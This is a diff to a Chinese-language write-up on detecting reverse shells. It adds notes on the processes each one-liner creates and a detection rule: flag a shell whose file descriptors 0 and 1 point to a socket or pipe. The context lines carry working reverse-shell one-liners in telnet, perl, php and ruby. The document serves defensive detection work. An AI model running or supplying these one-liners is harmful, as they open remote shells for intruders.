@@ -116,6 +116,12 @@ telnet 127.0.0.1 1234 | /bin/bash | telnet 127.0.0.1 12345
 
 ![agent](../images/WechatIMG61.jpeg)
 
+目标机执行后的结果如下：
+
+创建了bash进程，0和1描述符都指向了pipe。
+匹配规则：bash进程的0，和1文件描述符指向pipe
+
+
 
 ```perl
 perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -148,6 +154,11 @@ php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ![agent](../images/WechatIMG54.jpeg)
 
+目标机执行后的结果如下：
+
+创建了sh进程，0和1描述符都指向了socket。
+
+匹配规则：sh的0，和1文件描述符指向socket
 
 
 ```php
@@ -158,6 +169,15 @@ php -r 'exec("/bin/bash -i >& /dev/tcp/127.0.0.1/1234")'
 ![agent](../images/WechatIMG53.jpeg)
 
 
+
+目标机执行后的结果如下：
+
+创建了一个常住进程“bash -i”， 它的得0和1文件描述符都指向socket。
+
+匹配规则：bash进程的0，和1文件描述符指向socket
+
+
+
 ```ruby
 
 ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
@@ -166,7 +186,11 @@ ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -
 
 ![agent](../images/WechatIMG54.jpeg)
 
+目标机执行后的结果如下：
 
+创建了sh进程，0和1描述符都指向了socket。
+
+匹配规则：sh的0，和1文件描述符指向socket
 
 ```bash
 
@@ -367,7 +391,7 @@ int main(void){
 
 归纳起来，shell环境的进程如果0和1（或某一个）文件描述符都关联到socket或者pipe，就认为它是反弹shell。
 
- shell 环境包含： sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
+shell 环境包含： sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
 
 
 
